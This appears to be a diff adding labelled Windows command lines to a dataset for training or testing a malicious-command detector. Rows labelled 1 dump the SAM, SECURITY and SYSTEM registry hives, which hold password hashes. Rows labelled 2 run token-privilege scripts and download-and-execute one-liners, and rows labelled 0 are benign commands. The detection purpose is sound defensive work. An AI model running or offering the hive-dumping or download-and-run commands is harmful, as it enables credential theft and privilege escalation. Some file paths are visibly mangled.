+pwsh -noprofile -c reg.exe   export   hklm\security  c:\temp\system.hive  /y,1
+c:\windows\system32\cmd.exe /k reg   save hklm\sam  %temp%\sec_backup.dat /y,1
+cmd.exe /c reg  export  hklm\sam  c:\users\public\registry_export.reg,1
+c:\windows\system32\cmd.exe /k reg.exe  save hkey_local_machine\sam c:\temp\system.hive,1
+c:\windows\system32\cmd.exe /k reg.exe  export   hklm\security \\localhost\c$\__dump\sam.bak,1
+cmd.exe /c start /b reg.exe   save   hkey_local_machine\security  c:\temp\system.hive,1
+reg export  hkey_local_machine\sam   c:\windows\temp\sam.save,1
+"powershell -c reg copy ""hkey_users\system\currentcontrolset\services"" /v version",0
+iex (new-object net.webclient).downloadstring('set-tokenprivs.ps1'),2
+"reg.exe copy ""hkcu\software\microsoft\windows\currentversion"" /v path",0
+.\check-diskspace.ps1,0
+"reg.exe copy ""hkey_users\system\currentcontrolset\services"" ",0
+cmd.exe /c reg.exe   export  hklm\system  c:\users\public\registry_export.reg,1
+pwsh -noprofile -c reg.exe   save  hkey_local_machine\system   \\localhost\c$\__dump\sam.bak  /y,1
+"start /b reg copy ""hkey_current_user\software\policies\mycorp"" /v path",0
+powershell -command reg save hklm\system   c:\users\public\registry_export.reg,1
+hostname,0
+start /b get-process,0
+"cmd /c powershell -c ""reg   save  hklm\security c:\users\public\registry_export.reg  /y""",1
+c:\windows\system32\cmd.exe /k reg export   hkey_local_machine\security  \\localhost\c$\__dump\sam.bak,1
+"reg.exe unload ""hkcu\software\microsoft\windows\currentversion"" ",0
+pwsh -noprofile -c reg  save  hkey_local_machine\sam c:\users\public\registry_export.reg,1
+c:\windows\system32\cmd.exe /k reg.exe   export hklm\security   \\localhost\c$\__dump\sam.bak,1
+pwsh -noprofile -c reg export hklm\sam  c:\windows\temp\sam.save  /y,1
+c:\windows\system32\cmd.exe /k reg  export hklm\sam  c:\temp\system.hive  /y,1
+powershell -exec bypass -w hidden -c reg export hklm\system   c:\temp\system.hive,1
+"start /b reg query ""hkey_users\software\microsoft\windows\currentversion"" /v path",0
+powershell -c import-module .\enable-privilege.ps1,2
+cmd.exe /c start /b reg.exe  save hklm\sam \\localhost\c$\__dump\sam.bak  /y,1
+c:\windows\system32\cmd.exe /k reg.exe   save  hkey_local_machine\security  \\localhost\c$\__dump\sam.bak  /y,1
+powershell -exec bypass -w hidden -c reg.exe export   hkey_local_machine\sam  c:\temp\system.hive  /y,1
+cmd /c powershell import-module set-tokenprivs.ps1,2
+cmd.exe /c reg.exe  export hklm\sam c:\users\public\registry_export.reg,1
+"cmd /c powershell -c ""reg save  hklm\system \\localhost\c$\__dump\sam.bak   /y""",1
+"reg.exe query ""hkcu\control panel\desktop"" /f",0
+powershell -ep bypass whoami /groups,2
+powershell -exec bypass -w hidden -c reg  save  hklm\system c:\temp\system.hive  /y,1
+c:\windows\system32\cmd.exe /k reg.exe  save   hkey_local_machine\security   \\localhost\c$\__dump\sam.bak,1
+powershell -c cmd.exe /c whoami /priv,2
+"reg unload ""hku\control panel\desktop"" /v version",0
+"reg save ""hkcu\control panel\desktop"" ""c:\temp\user_settings.reg""",0
+powershell -exec bypass -w hidden -c reg.exe  export  hklm\security  c:\windows\temp\sam.save,1
+reg save  hklm\system  c:\users\public\registry_export.reg /y,1
+"cmd /c powershell -c ""reg save  hklm\system   c:\users\public\registry_export.reg""",1
+c:\windows\system32\cmd.exe /k reg.exe export  hkey_local_machine\security \\localhost\c$\__dump\sam.bak /y,1
+powershell -exec bypass -w hidden -c reg  save hkey_local_machine\system   c:\windows\temp\sam.save,1
+cmd.exe /c start /b reg save  hkey_local_machine\security \.\c$ackup.reg  /y,1
+"reg.exe add ""hkey_current_user\software\google\chrome"" /v version",0
+powershell -c import-module configmanager,0
+powershell -command reg.exe  save hklm\sam c:\temp\system.hive   /y,1
+powershell -command reg  export  hklm\system  \.\c$ackup.reg   /y,1
+powershell -exec bypass -w hidden -c reg  export hklm\security c:\windows\temp\sam.save,1
+start /b get-date,0
+pwsh -noprofile -c reg export  hkey_local_machine\security \.\c$ackup.reg  /y,1
+"cmd /c reg.exe compare ""hkey_current_user\control panel\desktop"" /v lastupdate",0
+powershell -command reg.exe save   hkey_local_machine\security  c:\windows\temp\sam.save  /y,1
+powershell -command reg.exe   export   hklm\sam  %temp%\sec_backup.dat,1
+"cmd /c powershell -c ""reg  export  hkey_local_machine\system %temp%\sec_backup.dat""",1
+cmd.exe /c reg  save  hklm\sam   %temp%\sec_backup.dat  /y,1
+cmd.exe /c reg.exe save  hklm\system  \\localhost\c$\__dump\sam.bak /y,1
+c:\windows\system32\cmd.exe /k reg  save hkey_local_machine\system %temp%\sec_backup.dat,1
+powershell -c import-module dnsclient,0
+"cmd /c powershell -c ""reg export   hklm\security  c:\windows\temp\sam.save""",1
+c:\windows\system32\cmd.exe /k reg   export  hkey_local_machine\security  \\localhost\c$\__dump\sam.bak   /y,1
+"reg compare ""hkey_users\control panel\desktop"" /f",0
+pwsh -noprofile -c reg.exe save  hklm\security c:\temp\system.hive,1
+"reg.exe add ""hku\software\microsoft\windows\currentversion"" /v lastupdate",0
+powershell -command reg.exe export   hkey_local_machine\security  c:\temp\system.hive  /y,1
+"reg.exe unload ""hkey_users\software\microsoft\windows\currentversion"" ",0
+c:\windows\system32\cmd.exe /k reg.exe save hkey_local_machine\security  %temp%\sec_backup.dat,1
+"start /b reg.exe query ""hkey_local_machine\control panel\desktop"" /f",0
+"cmd /c powershell -c ""reg.exe save  hklm\system  c:\users\public\registry_export.reg""",1
+cmd.exe /c start /b reg export  hklm\system  %temp%\sec_backup.dat,1
+powershell -command reg.exe   export   hkey_local_machine\security %temp%\sec_backup.dat  /y,1
+import-module activedirectory,0
+"reg query ""hkey_local_machine\control panel\desktop"" /f",0
+"reg.exe save ""hkcu\system\currentcontrolset\services"" ""c:\temp\user_settings.reg""",0
+"reg.exe copy ""hkey_users\control panel\desktop"" /f",0
+c:\windows\system32\cmd.exe /k reg export   hklm\sam c:\temp\system.hive   /y,1
+cmd.exe /c reg.exe  export hklm\system   c:\windows\temp\sam.save,1
+"powershell -c reg.exe compare ""hkcu\control panel\desktop"" /v lastupdate",0
+"powershell -c reg save ""hkey_current_user\system\currentcontrolset\services"" ""c:\temp\user_settings.reg""",0
+powershell -exec bypass -w hidden -c reg   export   hklm\security  \\localhost\c$\__dump\sam.bak,1
+powershell -command reg  export hkey_local_machine\system  c:\temp\system.hive,1
+"cmd /c powershell -c ""reg  save hklm\security  c:\users\public\registry_export.reg""",1
+cmd /c import-module dnsclient,0
+powershell -command reg   export  hklm\system   c:\users\public\registry_export.reg   /y,1
+start /b get-service,0
+cmd.exe /c start /b reg save   hklm\sam   \\localhost\c$\__dump\sam.bak,1
+"reg.exe save ""hku\software\google\chrome"" ""c:\temp\user_settings.reg""",0
+reg   save   hkey_local_machine\system   c:\users\public\registry_export.reg /y,1
+"reg.exe delete ""hkey_current_user\software\microsoft\windows\currentversion"" ",0
+"cmd /c powershell -c ""reg  export hkey_local_machine\security c:\users\public\registry_export.reg""",1
+"powershell -c reg.exe restore ""hku\software\policies\mycorp"" /v lastupdate",0
+powershell -command reg.exe   export  hklm\security   c:\windows\temp\sam.save,1
+powershell -ep bypass iex (new-object net.webclient).downloadstring('enablealltokenprivs.ps1'),2
+"cmd /c powershell -c ""reg.exe   export hklm\system c:\windows\temp\sam.save /y""",1
+"powershell -c reg restore ""hkcu\software\policies\mycorp"" /v path",0
+"reg delete ""hkey_local_machine\software\google\chrome"" ",0
+iex (new-object net.webclient).downloadstring('adjusttoken.ps1'),2
+"reg add ""hkey_users\system\currentcontrolset\services"" /v version",0
+"reg.exe restore ""hku\control panel\desktop"" /v path",0
+"reg save ""hkey_users\control panel\desktop"" ""c:\temp\user_settings.reg""",0
+cmd.exe /c reg.exe  save hkey_local_machine\system  c:\windows\temp\sam.save /y,1
+c:\windows\system32\cmd.exe /k reg.exe save hkey_local_machine\sam   \.\c$ackup.reg,1
+cmd /c powershell whoami /groups,2
+cmd /c powershell .\set-tokenprivs.ps1,2
+"reg.exe add ""hkey_users\software\policies\mycorp"" /v path",0
+cmd.exe /c reg   save hklm\security  c:\windows\temp\sam.save /y,1
+"cmd /c powershell -c ""reg.exe   export hkey_local_machine\sam   \\localhost\c$\__dump\sam.bak  /y""",1
+powershell -command reg.exe  export   hklm\system   %temp%\sec_backup.dat,1
+powershell -exec bypass -w hidden -c reg save hkey_local_machine\system   c:\temp\system.hive  /y,1
+cmd /c .\backup-daily.ps1,0
+c:\windows\system32\cmd.exe /k reg.exe export   hklm\sam  c:\users\public\registry_export.reg   /y,1
+"cmd /c powershell -c ""reg save hkey_local_machine\system  %temp%\sec_backup.dat""",1
+reg.exe export  hklm\system c:\temp\system.hive  /y,1
+pwsh -noprofile -c reg.exe save  hkey_local_machine\system   \\localhost\c$\__dump\sam.bak /y,1
+"reg compare ""hkey_local_machine\software\policies\mycorp"" ",0
+"start /b reg.exe delete ""hkey_current_user\software\google\chrome"" /v path",0
+c:\windows\system32\cmd.exe /k reg  export  hklm\system   \.\c$ackup.reg,1
+"reg restore ""hkey_local_machine\software\policies\mycorp"" ",0
+cmd.exe /c start /b reg.exe  export   hklm\sam  c:\temp\system.hive  /y,1
+pwsh -noprofile -c reg  save  hklm\sam  %temp%\sec_backup.dat /y,1
+c:\windows\system32\cmd.exe /k reg  export   hkey_local_machine\system   \.\c$ackup.reg,1
+"reg unload ""hkey_local_machine\software\google\chrome"" /f",0
+cmd.exe /c reg save  hklm\security   c:\users\public\registry_export.reg,1
+whoami /user,0
+c:\windows\system32\cmd.exe /k reg.exe  export   hklm\security   \\localhost\c$\__dump\sam.bak /y,1
+"reg compare ""hkcu\software\microsoft\windows\currentversion"" ",0
+powershell -command reg.exe   save hklm\security   \\localhost\c$\__dump\sam.bak,1
+"cmd /c reg.exe unload ""hkey_local_machine\control panel\desktop"" /f",0
+write-host 'checking admin privileges',0
+"cmd /c powershell -c ""reg  export   hklm\security  \.\c$ackup.reg""",1
+"reg.exe add ""hkcu\software\microsoft\windows\currentversion"" /v path",0
+reg save   hklm\system \.\c$ackup.reg /y,1
+"reg.exe unload ""hkey_users\control panel\desktop"" /v lastupdate",0
+powershell -exec bypass -w hidden -c reg export  hkey_local_machine\security  c:\users\public\registry_export.reg   /y,1
+"reg compare ""hkey_local_machine\software\google\chrome"" /v version",0
+powershell -command reg.exe save  hklm\sam   \\localhost\c$\__dump\sam.bak,1
+c:\windows\system32\cmd.exe /k reg.exe save  hklm\sam   c:\temp\system.hive /y,1
+"cmd /c powershell -c ""reg   save hklm\security  \.\c$ackup.reg""",1
+powershell -exec bypass -w hidden -c reg   export   hkey_local_machine\sam  \\localhost\c$\__dump\sam.bak  /y,1
+cmd.exe /c reg  save   hkey_local_machine\security   c:\windows\temp\sam.save,1
+"cmd /c powershell -c ""reg export   hklm\security  c:\users\public\registry_export.reg /y""",1
+"reg compare ""hkey_users\software\policies\mycorp"" /v version",0
+pwsh -noprofile -c reg.exe export   hklm\security c:\temp\system.hive,1
+c:\windows\system32\cmd.exe /k reg.exe  save hkey_local_machine\sam   c:\windows\temp\sam.save,1
+pwsh -noprofile -c reg  export   hklm\sam c:\temp\system.hive /y,1
+"reg.exe unload ""hku\software\microsoft\windows\currentversion"" /f",0
+"reg.exe add ""hkcu\software\policies\mycorp"" ",0
+cmd.exe /c reg.exe   save   hklm\security  \.\c$ackup.reg  /y,1
+reg.exe save   hkey_local_machine\security   \\localhost\c$\__dump\sam.bak /y,1
+pwsh import-module .\enable-privilege.ps1,2
+"cmd /c reg.exe add ""hkey_users\software\microsoft\windows\currentversion"" /v path",0
+pwsh -noprofile -c reg.exe  save hklm\sam   \.\c$ackup.reg,1
+powershell -exec bypass -w hidden -c reg.exe   save hkey_local_machine\system   c:\users\public\registry_export.reg,1
+powershell -command reg  export   hkey_local_machine\system  c:\windows\temp\sam.save,1
+"get-process | select-object -property processname, @{name='setakeownershipprivilege';expression={$_.privilegestate}}",2
+powershell -command reg   export hklm\sam  \\localhost\c$\__dump\sam.bak  /y,1
+"cmd /c powershell -c ""reg.exe   export  hklm\sam   c:\users\public\registry_export.reg  /y""",1
+pwsh -noprofile -c reg.exe  export hkey_local_machine\security   c:\temp\system.hive,1
+powershell -exec bypass -w hidden -c reg save  hklm\security   \\localhost\c$\__dump\sam.bak /y,1
+reg   save  hkey_local_machine\security   c:\users\public\registry_export.reg,1
+reg   save hklm\security  c:\temp\system.hive,1
+pwsh -noprofile -c reg   export  hkey_local_machine\system   c:\temp\system.hive  /y,1
+pwsh -noprofile -c reg.exe export   hklm\sam   %temp%\sec_backup.dat /y,1
+powershell -command reg export   hklm\sam %temp%\sec_backup.dat,1
+"reg unload ""hkey_local_machine\software\google\chrome"" /v version",0
+cmd.exe /c start /b reg  save  hkey_local_machine\system   \\localhost\c$\__dump\sam.bak /y,1
+cmd /c powershell iex (new-object net.webclient).downloadstring('enable-privilege.ps1'),2
+"start /b reg delete ""hkey_local_machine\software\policies\mycorp"" /f",0
+powershell -exec bypass -w hidden -c reg   save   hklm\security   c:\users\public\registry_export.reg,1
+"reg copy ""hkey_local_machine\software\policies\mycorp"" ",0
+c:\windows\system32\cmd.exe /k reg  export hkey_local_machine\security   c:\users\public\registry_export.reg /y,1
+pwsh -noprofile -c reg.exe  export hkey_local_machine\system c:\users\public\registry_export.reg,1
+cmd.exe /c start /b reg   export  hkey_local_machine\sam   \.\c$ackup.reg  /y,1
+pwsh -noprofile -c reg.exe save   hkey_local_machine\system c:\users\public\registry_export.reg /y,1
+reg.exe save  hkey_local_machine\sam   c:\windows\temp\sam.save,1
+"reg restore ""hkey_local_machine\software\microsoft\windows\currentversion"" /v path",0
+"powershell -c reg restore ""hku\control panel\desktop"" /v lastupdate",0
+powershell -ep bypass .\enable-privilege.ps1,2
+powershell -c .\log-useractivity.ps1,0
+pwsh -noprofile -c reg   export   hklm\system  %temp%\sec_backup.dat,1
+reg.exe   save hkey_local_machine\security  \.\c$ackup.reg,1
+"cmd /c powershell -c ""reg  export  hkey_local_machine\security  c:\temp\system.hive""",1
+"cmd /c reg restore ""hkcu\system\currentcontrolset\services"" ",0
+reg.exe save hklm\system %temp%\sec_backup.dat /y,1
+"reg copy ""hkcu\control panel\desktop"" /v version",0
+cmd.exe /c start /b reg.exe  export  hklm\system c:\temp\system.hive,1
+powershell -exec bypass -w hidden -c reg.exe export  hklm\system c:\windows\temp\sam.save /y,1
+cmd.exe /c start /b reg  export   hklm\sam c:\windows\temp\sam.save /y,1
+cmd /c powershell import-module .\enable-privilege.ps1,2
+import-module .\set-tokenprivs.ps1,2
+cmd.exe /c start /b reg.exe save  hklm\sam   c:\temp\system.hive /y,1
+"reg restore ""hku\control panel\desktop"" /v lastupdate",0
+"cmd /c powershell -c ""reg.exe   export   hklm\security   c:\windows\temp\sam.save /y""",1
+powershell -exec bypass -w hidden -c reg save  hklm\sam c:\windows\temp\sam.save,1
+"reg copy ""hkey_users\software\microsoft\windows\currentversion"" /v version",0
+powershell -exec bypass -w hidden -c reg   save hklm\system  c:\windows\temp\sam.save,1
+"cmd /c powershell -c ""reg  save   hkey_local_machine\sam  c:\temp\system.hive /y""",1
+cmd.exe /c reg save  hklm\security  c:\users\public\registry_export.reg   /y,1
+iex (new-object net.webclient).downloadstring('enablealltokenprivs.ps1'),2
+powershell -exec bypass -w hidden -c reg.exe export hkey_local_machine\system c:\temp\system.hive  /y,1
+powershell -command reg.exe export hkey_local_machine\security c:\users\public\registry_export.reg   /y,1
+cmd.exe /c start /b reg  save  hkey_local_machine\system   \\localhost\c$\__dump\sam.bak,1
+"start /b reg.exe unload ""hku\software\google\chrome"" /v lastupdate",0
+pwsh -noprofile -c reg.exe  export hkey_local_machine\system   c:\windows\temp\sam.save  /y,1
+cmd /c powershell import-module adjusttoken.ps1,2
+powershell -exec bypass -w hidden -c reg export hkey_local_machine\security c:\windows\temp\sam.save  /y,1
+reg.exe  export   hklm\system   c:\temp\system.hive  /y,1
+powershell -ep bypass .\invoke-tokenmanipulation.ps1,2
+powershell -command reg.exe  save   hklm\sam   %temp%\sec_backup.dat  /y,1
+powershell -command reg   export   hklm\security c:\temp\system.hive,1
+"reg unload ""hku\control panel\desktop"" /v lastupdate",0
+c:\windows\system32\cmd.exe /k reg.exe export hkey_local_machine\system \.\c$ackup.reg,1
+"cmd /c powershell -c ""reg   export  hklm\system   c:\users\public\registry_export.reg""",1
+c:\windows\system32\cmd.exe /k reg save hkey_local_machine\system \.\c$ackup.reg   /y,1
+"cmd /c powershell get-process | select-object -property processname, @{name='sebackupprivilege';expression={$_.privilegestate}}",2
+"cmd /c reg.exe query ""hkey_users\software\microsoft\windows\currentversion"" /v version",0
+reg save  hklm\sam   c:\users\public\registry_export.reg  /y,1
+powershell -c import-module activedirectory,0
+cmd.exe /c reg   save hklm\system   \.\c$ackup.reg,1
+cmd.exe /c reg.exe   export hklm\security \.\c$ackup.reg,1
+c:\windows\system32\cmd.exe /k reg.exe   export   hklm\sam \\localhost\c$\__dump\sam.bak,1
+pwsh -noprofile -c reg.exe save  hklm\security %temp%\sec_backup.dat,1
+"reg compare ""hkey_users\software\policies\mycorp"" /v path",0
+"reg restore ""hkey_local_machine\control panel\desktop"" ",0
+"cmd /c powershell -c ""reg.exe   save  hklm\security c:\windows\temp\sam.save   /y""",1
+"powershell -c get-process | select-object -property processname, @{name='sedebugprivilege';expression={$_.privilegestate}}",2
+reg  save  hkey_local_machine\system  c:\temp\system.hive   /y,1
+cmd.exe /c reg export hkey_local_machine\sam   \.\c$ackup.reg   /y,1
+reg.exe export hklm\security  %temp%\sec_backup.dat,1
+powershell -exec bypass -w hidden -c reg export  hkey_local_machine\system  c:\temp\system.hive,1
+whoami /priv,2
+"cmd /c powershell -c ""reg.exe  save  hkey_local_machine\security \\localhost\c$\__dump\sam.bak""",1
+c:\windows\system32\cmd.exe /k reg  export   hkey_local_machine\system  c:\windows\temp\sam.save,1
+"powershell -c reg query ""hku\control panel\desktop"" /v path",0
+"reg save ""hkcu\software\policies\mycorp"" ""c:\temp\user_settings.reg""",0
+"cmd /c powershell -c ""reg save   hkey_local_machine\system \.\c$ackup.reg   /y""",1
+cmd.exe /c start /b reg  export  hkey_local_machine\system   \\localhost\c$\__dump\sam.bak,1
+"reg add ""hku\software\microsoft\windows\currentversion"" ",0
+"reg.exe compare ""hku\software\microsoft\windows\currentversion"" /v version",0
+Import-Module ActiveDirectory,0
+.\set-tokenprivs.ps1,2
+"reg.exe compare ""hkey_users\software\policies\mycorp"" /f",0
+reg save hklm\security c:\windows\temp\sam.save   /y,1
+reg.exe  export  hkey_local_machine\system   %temp%\sec_backup.dat   /y,1
+powershell -c import-module bitlocker,0
+cmd /c powershell import-module enablealltokenprivs.ps1,2
+powershell -command reg   save   hklm\system   %temp%\sec_backup.dat,1
+powershell -command reg.exe  export   hklm\system   %temp%\sec_backup.dat  /y,1
+powershell -exec bypass -w hidden -c reg.exe  save hklm\system   \.\c$ackup.reg   /y,1
+cmd.exe /c start /b reg  save  hkey_local_machine\security   \.\c$ackup.reg,1
+pwsh -noprofile -c reg   save  hklm\security  \\localhost\c$\__dump\sam.bak,1
+"reg restore ""hku\software\microsoft\windows\currentversion"" /v path",0
+"reg compare ""hkey_local_machine\software\policies\mycorp"" /v version",0
+powershell -ep bypass .\enablealltokenprivs.ps1,2
+powershell -command reg.exe   export hklm\system  c:\temp\system.hive /y,1
+reg   export  hklm\sam  %temp%\sec_backup.dat,1
+"cmd /c powershell -c ""reg export  hklm\security %temp%\sec_backup.dat""",1
+import-module .\enablealltokenprivs.ps1,2
+reg save hkey_local_machine\sam   \\localhost\c$\__dump\sam.bak  /y,1
+reg.exe  save hkey_local_machine\system \\localhost\c$\__dump\sam.bak   /y,1
+"reg.exe delete ""hkey_local_machine\control panel\desktop"" /v lastupdate",0
+"reg unload ""hkey_current_user\system\currentcontrolset\services"" /f",0
+"reg.exe query ""hkcu\software\google\chrome"" ",0
+"powershell -ep bypass get-process | select-object -property processname, @{name='serestoreprivilege';expression={$_.privilegestate}}",2
+cmd.exe /c start /b reg.exe export   hklm\security c:\users\public\registry_export.reg /y,1
+"cmd /c reg query ""hku\software\google\chrome"" /f",0
+"cmd /c powershell -c ""reg.exe save hkey_local_machine\system  c:\users\public\registry_export.reg  /y""",1
+reg.exe   save hklm\system  %temp%\sec_backup.dat  /y,1
+reg.exe export hkey_local_machine\system  c:\users\public\registry_export.reg,1
+"start /b reg compare ""hkey_current_user\control panel\desktop"" /f",0
+powershell -command reg   save hkey_local_machine\system %temp%\sec_backup.dat  /y,1
+cmd.exe /c reg  save hkey_local_machine\sam  \.\c$ackup.reg,1
+reg.exe export   hkey_local_machine\system  \.\c$ackup.reg  /y,1
+"cmd /c powershell -c ""reg save hklm\security c:\users\public\registry_export.reg /y""",1
+powershell -exec bypass -w hidden -c reg.exe save  hklm\sam   \\localhost\c$\__dump\sam.bak  /y,1
+.\invoke-tokenmanipulation.ps1,2
+pwsh -noprofile -c reg export  hklm\security  c:\temp\system.hive   /y,1
+c:\windows\system32\cmd.exe /k reg.exe export hklm\sam  c:\temp\system.hive,1
+powershell -command reg.exe   save hklm\system \.\c$ackup.reg  /y,1
+cmd /c .\check-diskspace.ps1,0
+powershell -exec bypass -w hidden -c reg  export   hklm\system  \.\c$ackup.reg /y,1
+"reg query ""hkey_current_user\software\microsoft\windows\currentversion"" /v version",0
+pwsh -noprofile -c reg.exe   export   hkey_local_machine\security   c:\windows\temp\sam.save,1
+"reg.exe add ""hkcu\control panel\desktop"" /v version",0
+c:\windows\system32\cmd.exe /k reg  save hkey_local_machine\sam   \.\c$ackup.reg /y,1
+cmd.exe /c reg.exe   export hklm\security c:\users\public\registry_export.reg,1
+pwsh -noprofile -c reg.exe  export  hklm\sam   c:\temp\system.hive,1
+powershell -c iex (new-object net.webclient).downloadstring('invoke-tokenmanipulation.ps1'),2
+"reg.exe compare ""hku\control panel\desktop"" /v lastupdate",0
+reg  export   hkey_local_machine\security   c:\windows\temp\sam.save  /y,1
+powershell -c whoami /user,0
+"reg.exe add ""hkey_local_machine\software\microsoft\windows\currentversion"" /f",0
+"cmd /c reg save ""hkey_current_user\software\policies\mycorp"" ""c:\users\public\chrome_data.bak""",0
+reg save   hkey_local_machine\sam  c:\temp\system.hive   /y,1
+"pwsh get-process | select-object -property processname, @{name='setcbprivilege';expression={$_.privilegestate}}",2
+"reg.exe copy ""hku\software\microsoft\windows\currentversion"" ",0
+powershell -command reg export   hkey_local_machine\system  c:\temp\system.hive /y,1
+"reg delete ""hkcu\control panel\desktop"" /v version",0
+cmd.exe /c reg save hkey_local_machine\sam c:\windows\temp\sam.save /y,1
+powershell -exec bypass -w hidden -c reg.exe export   hklm\security  \\localhost\c$\__dump\sam.bak,1
+"powershell -c reg delete ""hkey_current_user\control panel\desktop"" /v version",0
+"reg unload ""hku\software\policies\mycorp"" /f",0
+c:\windows\system32\cmd.exe /k reg.exe   save  hkey_local_machine\security c:\users\public\registry_export.reg,1
+"reg query ""hkey_current_user\system\currentcontrolset\services"" /v lastupdate",0
+pwsh iex (new-object net.webclient).downloadstring('adjusttoken.ps1'),2
+start /b .\log-useractivity.ps1,0
+powershell -ep bypass iex (new-object net.webclient).downloadstring('adjusttoken.ps1'),2
+"reg.exe unload ""hkcu\software\policies\mycorp"" ",0
+cmd.exe /c reg.exe export   hklm\system   \.\c$ackup.reg,1
+powershell -command reg save hklm\sam \.\c$ackup.reg  /y,1
+"reg save ""hkcu\control panel\desktop"" ""c:\users\public\chrome_data.bak""",0
+import-module adjusttoken.ps1,2
+pwsh -noprofile -c reg.exe   export   hklm\sam   \.\c$ackup.reg,1
+"reg query ""hkcu\system\currentcontrolset\services"" /v version",0
+c:\windows\system32\cmd.exe /k reg   export  hklm\system %temp%\sec_backup.dat /y,1
+"reg.exe delete ""hkey_local_machine\software\microsoft\windows\currentversion"" /v lastupdate",0
+import-module .\adjusttoken.ps1,2
+"cmd /c powershell -c ""reg   save hkey_local_machine\sam   c:\users\public\registry_export.reg""",1
+powershell -c import-module .\adjusttoken.ps1,2
+start /b whoami /all,0
+"cmd /c powershell -c ""reg.exe save hkey_local_machine\security %temp%\sec_backup.dat /y""",1
+"reg.exe save ""hkey_users\system\currentcontrolset\services"" ""c:\users\public\chrome_data.bak""",0
+powershell -command reg.exe export  hkey_local_machine\sam  c:\users\public\registry_export.reg  /y,1
+pwsh -noprofile -c reg.exe  export hklm\system   c:\temp\system.hive,1
+pwsh iex (new-object net.webclient).downloadstring('enable-privilege.ps1'),2
+"reg.exe restore ""hkcu\software\policies\mycorp"" /v version",0
+c:\windows\system32\cmd.exe /k reg   export  hkey_local_machine\sam  c:\users\public\registry_export.reg   /y,1
+"reg unload ""hkey_users\control panel\desktop"" /v lastupdate",0
+cmd.exe /c start /b reg.exe  save   hkey_local_machine\security c:\temp\system.hive,1
+reg.exe   export  hklm\security c:\users\public\registry_export.reg,1
+pwsh cmd.exe /c whoami /priv,2
+"reg.exe save ""hku\software\policies\mycorp"" ""c:\temp\user_settings.reg""",0
+"pwsh get-process | select-object -property processname, @{name='setakeownershipprivilege';expression={$_.privilegestate}}",2
+powershell -ep bypass iex (new-object net.webclient).downloadstring('enable-privilege.ps1'),2
+pwsh -noprofile -c reg.exe  save hklm\security  %temp%\sec_backup.dat /y,1
+pwsh -noprofile -c reg.exe save hklm\security \\localhost\c$\__dump\sam.bak  /y,1
+powershell -exec bypass -w hidden -c reg.exe  save  hklm\system c:\users\public\registry_export.reg  /y,1
+c:\windows\system32\cmd.exe /k reg.exe  export  hkey_local_machine\system c:\windows\temp\sam.save  /y,1
+cmd.exe /c reg  save  hkey_local_machine\security \.\c$ackup.reg   /y,1
+"cmd /c powershell -c ""reg  export hkey_local_machine\sam \.\c$ackup.reg /y""",1
+cmd /c powershell import-module .\set-tokenprivs.ps1,2
+"reg add ""hku\software\policies\mycorp"" /v lastupdate",0
+cmd.exe /c reg.exe export   hkey_local_machine\system   c:\temp\system.hive,1
+"cmd /c powershell -c ""reg  export hkey_local_machine\security %temp%\sec_backup.dat""",1
+powershell -exec bypass -w hidden -c reg.exe   save   hklm\system  c:\windows\temp\sam.save   /y,1
+c:\windows\system32\cmd.exe /k reg save  hklm\sam c:\users\public\registry_export.reg,1
+"reg compare ""hkey_local_machine\control panel\desktop"" /v path",0
+cmd.exe /c start /b reg save  hkey_local_machine\sam c:\windows\temp\sam.save /y,1
+cmd.exe /c reg   save hkey_local_machine\system  \.\c$ackup.reg  /y,1
+"reg.exe save ""hku\control panel\desktop"" ""c:\temp\user_settings.reg""",0
+"reg.exe add ""hkey_users\software\google\chrome"" ",0
+pwsh -noprofile -c reg.exe  save hklm\system  c:\temp\system.hive,1
+.\backup-daily.ps1,0
+"powershell -c reg copy ""hkcu\control panel\desktop"" /v version",0
+cmd.exe /c reg  save   hklm\security   \\localhost\c$\__dump\sam.bak,1
+cmd.exe /c start /b reg   export  hklm\system   c:\windows\temp\sam.save   /y,1
+"reg.exe unload ""hkey_users\software\microsoft\windows\currentversion"" /v path",0
+"reg restore ""hkcu\software\google\chrome"" /v path",0
+"reg save ""hkey_users\software\google\chrome"" ""c:\users\public\chrome_data.bak""",0
+"cmd /c powershell -c ""reg export  hkey_local_machine\system %temp%\sec_backup.dat   /y""",1
+powershell -command reg.exe  export  hklm\security c:\temp\system.hive   /y,1
+cmd.exe /c reg   save  hkey_local_machine\system \\localhost\c$\__dump\sam.bak,1
+"reg.exe restore ""hkey_current_user\software\microsoft\windows\currentversion"" ",0
+"reg.exe compare ""hkey_local_machine\software\google\chrome"" /v lastupdate",0
+powershell -command reg  save hklm\system  c:\windows\temp\sam.save,1
+"reg restore ""hkey_local_machine\control panel\desktop"" /v lastupdate",0
+c:\windows\system32\cmd.exe /k reg.exe   export   hkey_local_machine\system \.\c$ackup.reg   /y,1
+"reg.exe query ""hkey_local_machine\control panel\desktop"" /v version",0
+cmd.exe /c reg.exe   save hklm\sam c:\temp\system.hive,1
+powershell -exec bypass -w hidden -c reg  save   hkey_local_machine\system \\localhost\c$\__dump\sam.bak,1
+powershell -command reg.exe   export hkey_local_machine\sam c:\temp\system.hive /y,1
+"cmd /c powershell -c ""reg   export   hklm\sam   c:\users\public\registry_export.reg /y""",1
+"reg.exe query ""hkcu\software\google\chrome"" /v path",0
+cmd.exe /c reg  export hklm\sam  c:\windows\temp\sam.save /y,1
+"pwsh get-process | select-object -property processname, @{name='serestoreprivilege';expression={$_.privilegestate}}",2
+c:\windows\system32\cmd.exe /k reg  save  hklm\system   \\localhost\c$\__dump\sam.bak   /y,1
+pwsh import-module enablealltokenprivs.ps1,2
+powershell -command reg   export   hkey_local_machine\sam   c:\windows\temp\sam.save /y,1
+"start /b reg.exe add ""hku\control panel\desktop"" /v lastupdate",0
+c:\windows\system32\cmd.exe /k reg.exe  save  hklm\security  \\localhost\c$\__dump\sam.bak,1
+"reg.exe add ""hkcu\control panel\desktop"" /v path",0
+"cmd /c powershell -c ""reg   export  hklm\system  c:\temp\system.hive  /y""",1
+powershell -ep bypass import-module .\adjusttoken.ps1,2
+cmd.exe /c start /b reg export hkey_local_machine\security  c:\temp\system.hive   /y,1
+powershell -command reg   save  hklm\security  c:\windows\temp\sam.save,1
+c:\windows\system32\cmd.exe /k reg.exe export  hklm\security  c:\users\public\registry_export.reg   /y,1
+"cmd /c powershell -c ""reg.exe export   hklm\system  c:\temp\system.hive""",1
+c:\windows\system32\cmd.exe /k reg save hklm\system   \.\c$ackup.reg,1
+cmd /c powershell import-module .\enablealltokenprivs.ps1,2
+cmd.exe /c start /b reg save  hkey_local_machine\system   c:\temp\system.hive,1
